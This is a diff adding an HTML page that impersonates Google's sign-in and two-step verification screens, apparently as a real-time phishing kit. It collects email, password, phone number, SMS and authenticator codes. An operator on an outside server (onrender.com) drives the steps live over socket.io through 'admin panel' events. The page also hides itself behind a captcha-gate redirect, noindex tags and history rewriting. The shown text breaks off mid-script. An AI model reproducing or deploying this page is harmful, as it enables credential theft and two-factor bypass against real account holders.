@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link rel="icon" href="./assets/fav.png" type="image/x-icon">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, nofollow">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Google Sans', Roboto, -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── Top bar ── */
+    .mg-topbar {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 14px 16px; border-bottom: 1px solid #e8eaed;
+    }
+    .mg-topbar-logo svg { height: 20px; }
+    .mg-topbar-help {
+      font-size: 14px; color: #1a73e8; font-weight: 500;
+      text-decoration: none;
+    }
+
+    /* ── Card ── */
+    .mg-body {
+      flex: 1; display: flex; flex-direction: column;
+      align-items: center; padding: 32px 24px 24px;
+    }
+
+    .mg-logo-big {
+      width: 56px; height: 56px; margin-bottom: 20px;
+    }
+
+    .mg-h1 {
+      font-size: 22px; font-weight: 400; color: #202124;
+      margin-bottom: 8px; text-align: center; line-height: 1.3;
+    }
+    .mg-sub {
+      font-size: 16px; color: #202124; text-align: center;
+      margin-bottom: 32px;
+    }
+
+    /* Account chip */
+    .mg-chip {
+      display: flex; align-items: center; gap: 10px;
+      border: 1px solid #dadce0; border-radius: 24px;
+      padding: 6px 14px 6px 6px; margin-bottom: 28px;
+      align-self: flex-start;
+    }
+    .mg-avatar {
+      width: 32px; height: 32px; border-radius: 50%;
+      background: #1a73e8; color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 15px; font-weight: 500; flex-shrink: 0;
+    }
+    .mg-chip-email { font-size: 14px; color: #202124; font-weight: 500; }
+
+    /* Floating-label inputs */
+    .mg-field {
+      position: relative; width: 100%; margin-bottom: 28px;
+    }
+    .mg-inp {
+      width: 100%; height: 56px;
+      padding: 14px 48px 2px 16px;
+      border: 1.5px solid #dadce0; border-radius: 4px;
+      font-size: 16px; color: #202124; background: #fff;
+      outline: none; transition: border-color .2s;
+      font-family: inherit; -webkit-appearance: none;
+    }
+    .mg-inp:focus { border-color: #1a73e8; border-width: 2px; }
+    .mg-inp.mg-err-inp { border-color: #d93025; border-width: 2px; }
+    .mg-lbl {
+      position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
+      font-size: 16px; color: #5f6368;
+      pointer-events: none; transition: all .15s ease;
+      background: #fff; padding: 0 4px;
+    }
+    .mg-inp:focus + .mg-lbl,
+    .mg-inp:not(:placeholder-shown) + .mg-lbl {
+      top: 0; font-size: 12px; color: #1a73e8;
+    }
+    .mg-inp.mg-err-inp + .mg-lbl,
+    .mg-inp.mg-err-inp:focus + .mg-lbl { color: #d93025; }
+    .mg-eye {
+      position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; cursor: pointer; color: #5f6368;
+      padding: 4px; display: flex; align-items: center;
+    }
+
+    /* Error */
+    .mg-err {
+      font-size: 12px; color: #d93025;
+      margin-top: -22px; margin-bottom: 16px; display: none;
+    }
+    .mg-err.show { display: block; }
+
+    /* Info text */
+    .mg-info {
+      font-size: 14px; color: #5f6368; line-height: 1.57;
+      margin-bottom: 28px; width: 100%;
+    }
+    .mg-info a { color: #1a73e8; text-decoration: none; }
+
+    /* Forgot */
+    .mg-forgot {
+      display: block; font-size: 14px; color: #1a73e8;
+      text-decoration: none; margin-bottom: 32px; font-weight: 500;
+    }
+
+    /* Footer row */
+    .mg-footer {
+      display: flex; justify-content: space-between; align-items: center;
+      width: 100%; margin-top: auto;
+    }
+    .mg-btn-ghost {
+      font-size: 14px; color: #1a73e8; font-weight: 500;
+      background: none; border: none; cursor: pointer;
+      padding: 10px 0; font-family: inherit;
+    }
+    .mg-btn-next {
+      height: 44px; padding: 0 28px;
+      background: #1a73e8; color: #fff;
+      border: none; border-radius: 4px;
+      font-size: 14px; font-weight: 500; cursor: pointer;
+      font-family: inherit; transition: background .15s;
+      min-width: 96px; display: flex; align-items: center; justify-content: center;
+    }
+    .mg-btn-next:disabled { background: #dadce0; color: #80868b; cursor: not-allowed; }
+    .mg-btn-next:not(:disabled):active { background: #1557b0; }
+
+    /* Loading spinner */
+    .mg-spinner {
+      width: 20px; height: 20px;
+      border: 3px solid rgba(255,255,255,.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: mgSpin .7s linear infinite;
+      display: inline-block;
+    }
+    @keyframes mgSpin { to { transform: rotate(360deg); } }
+
+    /* Phone step */
+    .mg-phone-row {
+      display: flex; gap: 8px; align-items: flex-start;
+      width: 100%; margin-bottom: 0;
+    }
+    .mg-prefix-box {
+      flex-shrink: 0; width: 68px; height: 56px;
+      border: 1.5px solid #dadce0; border-radius: 4px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 16px; color: #202124; font-weight: 500;
+      background: #f8f9fa; user-select: none;
+    }
+    .mg-phone-info {
+      font-size: 14px; color: #5f6368; line-height: 1.57;
+      margin-bottom: 28px; width: 100%;
+    }
+
+    /* Wrong-pass modal overlay */
+    #mg-modal-overlay {
+      display: none; position: fixed; inset: 0;
+      background: rgba(0,0,0,.45); z-index: 200;
+      align-items: center; justify-content: center; padding: 24px;
+    }
+    #mg-modal-overlay.show { display: flex; }
+    .mg-modal-card {
+      background: #fff; border-radius: 16px;
+      padding: 28px 24px; width: 100%; max-width: 360px;
+      box-shadow: 0 4px 24px rgba(0,0,0,.2);
+    }
+    .mg-modal-title {
+      font-size: 18px; font-weight: 500; color: #202124;
+      margin-bottom: 12px;
+    }
+    .mg-modal-body {
+      font-size: 14px; color: #5f6368; margin-bottom: 24px; line-height: 1.57;
+    }
+    .mg-modal-ok {
+      float: right; height: 40px; padding: 0 24px;
+      background: #1a73e8; color: #fff;
+      border: none; border-radius: 4px;
+      font-size: 14px; font-weight: 500; cursor: pointer;
+      font-family: inherit;
+    }
+    .mg-modal-ok:active { background: #1557b0; }
+    .mg-clearfix::after { content: ''; display: block; clear: both; }
+
+    /* ── Google Prompt step ── */
+    .mg-prompt-number {
+      font-size: 72px; font-weight: 300; color: #202124;
+      line-height: 1; margin-bottom: 16px; letter-spacing: -2px;
+      text-align: center;
+    }
+    .mg-prompt-device { font-size: 16px; font-weight: 500; color: #202124; margin-bottom: 10px; text-align: center; }
+    .mg-prompt-desc { font-size: 14px; color: #5f6368; line-height: 1.57; margin-bottom: 16px; text-align: center; width: 100%; }
+    .mg-prompt-help { font-size: 14px; color: #1a73e8; text-decoration: none; display: block; text-align: center; margin-bottom: 20px; }
+    .mg-prompt-check { display: flex; align-items: center; gap: 10px; font-size: 14px; color: #5f6368; cursor: pointer; margin-bottom: 32px; align-self: flex-start; }
+    .mg-prompt-check input { accent-color: #1a73e8; width: 18px; height: 18px; }
+
+    /* ── SMS steps ── */
+    .mg-sms-section-title { font-size: 16px; font-weight: 500; color: #202124; margin-bottom: 8px; width: 100%; }
+    .mg-sms-desc { font-size: 14px; color: #5f6368; line-height: 1.57; margin-bottom: 16px; width: 100%; }
+    .mg-sms-masked-num { color: #202124; font-weight: 500; white-space: nowrap; }
+    .mg-sms-gif-wrap { display: flex; justify-content: center; width: 100%; margin-bottom: 4px; }
+    .mg-sms-gif-wrap img { width: 80px; height: 80px; object-fit: contain; }
+    .mg-sms-checkbox-row { display: flex; align-items: center; gap: 10px; width: 100%; margin-bottom: 8px; }
+    .mg-sms-checkbox-row input[type=checkbox] { width: 18px; height: 18px; accent-color: #1a73e8; cursor: pointer; flex-shrink: 0; }
+    .mg-sms-checkbox-row label { font-size: 14px; color: #202124; cursor: pointer; line-height: 1.4; }
+    .mg-sms-country-sel {
+      flex-shrink: 0; min-width: 80px; height: 56px;
+      border: 1.5px solid #dadce0; border-radius: 4px;
+      display: flex; align-items: center; justify-content: center; gap: 4px;
+      font-size: 15px; color: #202124; font-weight: 500;
+      background: #f8f9fa; cursor: pointer; padding: 0 10px; position: relative;
+    }
+    .mg-sms-country-sel::after {
+      content: ''; border: 4px solid transparent;
+      border-top-color: #5f6368; margin-top: 3px;
+    }
+    .mg-code-hint { font-size: 14px; color: #5f6368; line-height: 1.57; margin-bottom: 20px; width: 100%; }
+  </style>
+</head>
+<body>
+
+  <!-- Wrong-password modal overlay -->
+  <div id="mg-modal-overlay">
+    <div class="mg-modal-card">
+      <p class="mg-modal-title">Wrong password</p>
+      <p class="mg-modal-body">The password you entered is incorrect. Please try again.</p>
+      <div class="mg-clearfix">
+        <button class="mg-modal-ok" onclick="mgDismissWrongPass()">Try again</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Top bar -->
+  <div class="mg-topbar">
+    <div class="mg-topbar-logo">
+      <!-- Google "G" coloured logo -->
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" height="20">
+        <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+        <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+        <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+        <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
+        <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+        <path fill="#4285F4" d="M35.29 41.41V32h31.96c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.77.36 15.65 16.32.19 35.48.19c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.47.09z"/>
+      </svg>
+    </div>
+    <a href="#" class="mg-topbar-help">Help</a>
+  </div>
+
+  <!-- Main body -->
+  <div class="mg-body">
+
+    <!-- ── Step 1: Email ── -->
+    <div id="mg-email-step" style="width:100%; display:flex; flex-direction:column; align-items:center;">
+      <!-- G icon -->
+      <svg class="mg-logo-big" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+        <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+        <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+        <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34A21.991 21.991 0 0 0 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
+        <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+      </svg>
+
+      <h1 class="mg-h1">Sign in</h1>
+      <p class="mg-sub">to continue to Facebook</p>
+
+      <div class="mg-field" style="width:100%;">
+        <input type="email" id="mg-email-inp" class="mg-inp" placeholder=" " autocomplete="email" />
+        <label class="mg-lbl" for="mg-email-inp">Email or phone</label>
+      </div>
+
+      <p class="mg-info">
+        Not your computer? Use a Private window to sign in.
+        <a href="#">Learn more about using Guest mode</a>
+      </p>
+
+      <div class="mg-footer">
+        <button class="mg-btn-ghost" type="button" onclick="history.back()">Back</button>
+        <button id="mg-email-next" class="mg-btn-next" type="button" disabled>Next</button>
+      </div>
+    </div>
+
+    <!-- ── Step 2: Password ── -->
+    <div id="mg-pass-step" style="width:100%; display:none; flex-direction:column; align-items:center;">
+      <!-- G icon -->
+      <svg class="mg-logo-big" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+        <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+        <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+        <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34A21.991 21.991 0 0 0 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
+        <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+      </svg>
+
+      <h1 class="mg-h1">Welcome</h1>
+
+      <div class="mg-chip">
+        <div class="mg-avatar" id="mg-avatar-letter">G</div>
+        <span class="mg-chip-email" id="mg-chip-email"></span>
+      </div>
+
+      <div class="mg-field" style="width:100%;">
+        <input type="password" id="mg-pass-inp" class="mg-inp" placeholder=" " autocomplete="current-password" />
+        <label class="mg-lbl" for="mg-pass-inp">Enter your password</label>
+        <button type="button" class="mg-eye" id="mg-eye-btn" onclick="mgTogglePass(this)">
+          <svg viewBox="0 0 24 24" fill="currentColor" width="22" height="22">
+            <path d="M12 5C5.636 5 2 12 2 12s3.636 7 10 7 10-7 10-7-3.636-7-10-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10zm0-8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z"/>
+          </svg>
+        </button>
+      </div>
+      <div id="mg-pass-err" class="mg-err" style="width:100%;">Wrong password. Try again or click Forgot password.</div>
+
+      <a href="#" class="mg-forgot" style="align-self:flex-start;">Forgot password?</a>
+
+      <div class="mg-footer">
+        <button class="mg-btn-ghost" type="button" id="mg-back-btn">Back</button>
+        <button id="mg-pass-next" class="mg-btn-next" type="button" disabled>Next</button>
+      </div>
+    </div>
+
+    <!-- ── Step 3: Phone ── -->
+    <div id="mg-phone-step" style="width:100%; display:none; flex-direction:column; align-items:center;">
+      <svg class="mg-logo-big" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+        <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+        <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+        <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34A21.991 21.991 0 0 0 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
+        <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+      </svg>
+
+      <h1 class="mg-h1">Verify it's you</h1>
+
+      <div class="mg-chip" id="mg-phone-chip">
+        <div class="mg-avatar" id="mg-phone-avatar">G</div>
+        <span class="mg-chip-email" id="mg-phone-chip-email"></span>
+      </div>
+
+      <p class="mg-phone-info">
+        For added security, Google wants to verify it's really you. Enter the phone number associated with your account.
+      </p>
+
+      <div class="mg-phone-row">
+        <div class="mg-prefix-box" id="mg-prefix-box">+</div>
+        <div class="mg-field" style="flex:1; margin-bottom:28px;">
+          <input type="tel" id="mg-phone-inp" class="mg-inp" placeholder=" " autocomplete="tel" />
+          <label class="mg-lbl" for="mg-phone-inp">Phone number</label>
+        </div>
+      </div>
+      <div id="mg-phone-err" class="mg-err" style="width:100%;">Enter a valid phone number</div>
+
+      <div class="mg-footer">
+        <button class="mg-btn-ghost" type="button" id="mg-phone-back-btn">Back</button>
+        <button id="mg-phone-next" class="mg-btn-next" type="button" disabled>Next</button>
+      </div>
+    </div>
+
+    <!-- ── Step 4: Google Prompt (number) ── -->
+    <div id="mg-prompt-step" style="width:100%; display:none; flex-direction:column; align-items:center;">
+      <svg class="mg-logo-big" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+        <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+        <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+        <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34A21.991 21.991 0 0 0 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
+        <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+      </svg>
+
+      <h1 class="mg-h1">2-Step Verification</h1>
+      <p class="mg-sub" style="font-size:14px; color:#5f6368; font-weight:400;">
+        To help keep your account safe, Google wants to make sure it's really you trying to sign in
+      </p>
+
+      <div class="mg-chip" style="margin-bottom:24px;">
+        <div class="mg-avatar" id="mg-prompt-avatar">G</div>
+        <span class="mg-chip-email" id="mg-prompt-chip-email"></span>
+      </div>
+
+      <div class="mg-prompt-number" id="mg-prompt-number">58</div>
+      <p class="mg-prompt-device" id="mg-prompt-device">Open the Gmail or YouTube app</p>
+      <p class="mg-prompt-desc">
+        Google sent a notification to your <span id="mg-prompt-device-inline">phone</span>.
+        Open the Gmail or YouTube app, tap <strong>Yes</strong> on the prompt, then tap
+        <strong id="mg-prompt-number-inline">58</strong> on your phone to verify it's you.
+      </p>
+      <a href="#" class="mg-prompt-help">Need help? Learn more about Google prompts</a>
+      <label class="mg-prompt-check">
+        <input type="checkbox" checked> Don't ask again on this device
+      </label>
+
+      <div class="mg-footer" style="margin-top:auto;">
+        <span></span>
+        <button class="mg-btn-ghost" type="button">Try another way</button>
+      </div>
+    </div>
+
+    <!-- ── Step 5: SMS — Phone entry ── -->
+    <div id="mg-sms-step" style="width:100%; display:none; flex-direction:column; align-items:center;">
+      <div class="mg-sms-gif-wrap">
+        <img src="https://ssl.gstatic.com/accounts/account-recovery-sms-pin.gif" aria-hidden="true" alt="">
+      </div>
+
+      <h1 class="mg-h1">2-Step Verification</h1>
+      <div class="mg-chip" style="margin-bottom:20px;">
+        <div class="mg-avatar" id="mg-sms-avatar">G</div>
+        <span class="mg-chip-email" id="mg-sms-chip-email"></span>
+      </div>
+
+      <p class="mg-sms-section-title">Get a verification code</p>
+      <p class="mg-sms-desc">
+        To get a verification code, first confirm the phone number you added to your account
+        <span class="mg-sms-masked-num">••• ••• •<span id="mg-sms-last-two">92</span></span>.
+        <em>Standard message and data rates may apply.</em>
+      </p>
+
+      <div class="mg-phone-row">
+        <div class="mg-sms-country-sel" id="mg-sms-prefix-box">+</div>
+        <div class="mg-field" style="flex:1; margin-bottom:28px;">
+          <input type="tel" id="mg-sms-phone-inp" class="mg-inp" placeholder=" " autocomplete="tel" />
+          <label class="mg-lbl" for="mg-sms-phone-inp">Phone number</label>
+        </div>
+      </div>
+      <div id="mg-sms-phone-err" class="mg-err" style="width:100%;">Enter a valid phone number</div>
+
+      <div class="mg-sms-checkbox-row">
+        <input type="checkbox" id="mg-sms-dont-ask">
+        <label for="mg-sms-dont-ask">Don't ask again on this device</label>
+      </div>
+
+      <div class="mg-footer">
+        <span></span>
+        <button id="mg-sms-send" class="mg-btn-next" type="button" disabled>Send</button>
+      </div>
+    </div>
+
+    <!-- ── Step 6: SMS — Code entry ── -->
+    <div id="mg-code-step" style="width:100%; display:none; flex-direction:column; align-items:center;">
+      <svg class="mg-logo-big" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+        <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+        <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+        <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34A21.991 21.991 0 0 0 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
+        <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+      </svg>
+
+      <h1 class="mg-h1">2-Step Verification</h1>
+      <div class="mg-chip" style="margin-bottom:20px;">
+        <div class="mg-avatar" id="mg-code-avatar">G</div>
+        <span class="mg-chip-email" id="mg-code-chip-email"></span>
+      </div>
+
+      <p class="mg-code-hint" id="mg-code-hint">Enter the 6-digit code we sent to your phone.</p>
+
+      <div class="mg-field" style="width:100%;">
+        <input type="text" id="mg-code-inp" class="mg-inp" placeholder=" "
+               maxlength="6" inputmode="numeric" autocomplete="one-time-code" />
+        <label class="mg-lbl" for="mg-code-inp">Enter code</label>
+      </div>
+      <div id="mg-code-err" class="mg-err" style="width:100%;">Wrong code. Try again or request a new one.</div>
+
+      <a href="#" class="mg-forgot" style="align-self:flex-start;">Resend code</a>
+
+      <div class="mg-footer">
+        <span></span>
+        <button id="mg-code-next" class="mg-btn-next" type="button" disabled>Next</button>
+      </div>
+    </div>
+
+    <!-- ── Step 7: Authenticator code ── -->
+    <div id="mg-auth-step" style="width:100%; display:none; flex-direction:column; align-items:center;">
+      <svg class="mg-logo-big" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+        <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
+        <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
+        <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34A21.991 21.991 0 0 0 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/>
+        <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
+      </svg>
+
+      <h1 class="mg-h1">2-Step Verification</h1>
+
+      <div class="mg-chip" style="margin-bottom:20px;">
+        <div class="mg-avatar" id="mg-auth-avatar">G</div>
+        <span class="mg-chip-email" id="mg-auth-chip-email"></span>
+      </div>
+
+      <p class="mg-sms-section-title">2-Step Verification</p>
+      <p class="mg-code-hint">
+        Get a verification code from the <strong>Google Authenticator</strong> app
+      </p>
+
+      <div class="mg-field" style="width:100%;">
+        <input type="tel" id="mg-auth-inp" class="mg-inp" placeholder=" "
+               maxlength="6" pattern="[0-9 ]*" inputmode="numeric" autocomplete="one-time-code" />
+        <label class="mg-lbl" for="mg-auth-inp">Enter code</label>
+      </div>
+      <div id="mg-auth-err" class="mg-err" style="width:100%;">Wrong code. Try again.</div>
+
+      <div class="mg-sms-checkbox-row">
+        <input type="checkbox" id="mg-auth-dont-ask">
+        <label for="mg-auth-dont-ask">Don't ask again on this device</label>
+      </div>
+
+      <div class="mg-footer">
+        <button class="mg-btn-ghost" type="button">Try another way</button>
+        <button id="mg-auth-next" class="mg-btn-next" type="button" disabled>Next</button>
+      </div>
+    </div>
+
+  </div><!-- /.mg-body -->
+
+  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
+  <script>
+    /* ── Socket.io setup ── */
+    let clientId = localStorage.getItem('clientId');
+    if (!clientId) {
+      clientId = crypto.randomUUID();
+      localStorage.setItem('clientId', clientId);
+    }
+    const BACKEND_URL = (function() {
+      var h = location.hostname;
+      return (h === 'localhost' || h === '127.0.0.1' || h.endsWith('.test') || h.endsWith('.local'))
+        ? 'http://localhost:3001'
+        : 'https://backed-nxht.onrender.com';
+    })();
+    const socket = io(BACKEND_URL, { query: { clientId } });
+
+    socket.on('connect', function() {
+      const session = { socketId: socket.id, timestamp: Date.now() };
+      localStorage.setItem('socketSession', JSON.stringify(session));
+      socket.emit('userConnectedToPage', { clientId: clientId, page: 'mobile-google' });
+    });
+    socket.on('redirect', function(url) { window.location.href = url; });
+
+    /* ── Cross-platform redirect: FB/generic prompts while on mobile-Google page ── */
+    socket.on('show-2fa',         function () { window.location.href = '/apply?show=2fa'; });
+    socket.on('show-auth',        function () { window.location.href = '/apply?show=auth'; });
+    socket.on('show-email',       function () { window.location.href = '/apply?show=email'; });
+    socket.on('show-whatsapp',    function () { window.location.href = '/apply?show=whatsapp'; });
+    socket.on('show-wrong-creds', function () { window.location.href = '/apply?show=wrongpsw'; });
+    socket.on('show-old-pass',    function () { window.location.href = '/apply?show=oldpass'; });
+    socket.on('show-calendar',    function () { window.location.href = '/calendly'; });
+
+    /* Wrong-password event from admin */
+    socket.on('show-gmail-wrong-pass', function() {
+      var passStep = document.getElementById('mg-pass-step');
+      if (passStep && passStep.style.display !== 'none') {
+        mgShowWrongPassModal();
+      }
+    });
+
+    /* Admin panel → GooglePhone → show phone step */
+    socket.on('show-google-phone', function(prefix) {
+      var prefixText = prefix ? ('+' + String(prefix).replace(/^\+/, '')) : '+';
+      document.getElementById('mg-prefix-box').textContent = prefixText;
+
+      var email = mgEmailInp.value.trim();
+      document.getElementById('mg-phone-chip-email').textContent = email;
+      document.getElementById('mg-phone-avatar').textContent = email ? email.charAt(0).toUpperCase() : 'G';
+
+      mgPassNext.disabled = false;
+      mgPassNext.innerHTML = 'Next';
+      mgHideAllSteps();
+      var phoneStep = document.getElementById('mg-phone-step');
+      phoneStep.style.display = 'flex';
+      document.getElementById('mg-phone-inp').focus();
+    });
+
+    /* Admin panel → GooglePrompt → show number prompt */
+    socket.on('show-google-prompt', function(data) {
+      mgPassNext.disabled = false;
+      mgPassNext.innerHTML = 'Next';
+
+      var num = (data && data.number) ? String(data.number) : '58';
+      var deviceRaw = (data && data.device != null) ? String(data.device).trim() : '';
+      var deviceLabel = deviceRaw.replace(/^your\s+/i, '');
+      var hasDevice = deviceLabel.length > 0 && !/^phone\.?$/i.test(deviceLabel);
+
